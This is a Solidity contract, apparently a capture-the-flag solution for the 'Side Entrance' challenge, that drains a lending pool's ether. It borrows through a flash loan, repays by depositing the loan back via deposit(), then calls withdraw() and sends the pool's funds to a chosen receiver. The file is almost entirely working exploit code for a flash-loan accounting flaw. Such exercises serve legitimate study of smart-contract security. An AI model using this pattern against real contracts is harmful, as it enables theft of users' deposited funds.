// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "@openzeppelin/contracts/utils/Address.sol";
interface ILender {
    function flashLoan(address receiver,uint256 amount) external;
}


interface ISideEntrance {

    function flashLoan(
        uint256 amount
    ) external;

    function deposit() payable external;
    function withdraw() external;

}

contract AttackerSideEntrance {
    using Address for address payable;
    address public pool;
    constructor(address _pool) {
        pool = _pool;
    }

    receive() payable external {

    }

    function execute() external payable {
        ISideEntrance(pool).deposit{value: msg.value}();
    }

    function attack(address receiver, uint amount) external{
        ISideEntrance(pool).flashLoan(amount);
        ISideEntrance(pool).withdraw();
        payable(receiver).sendValue(address(this).balance);
    }
}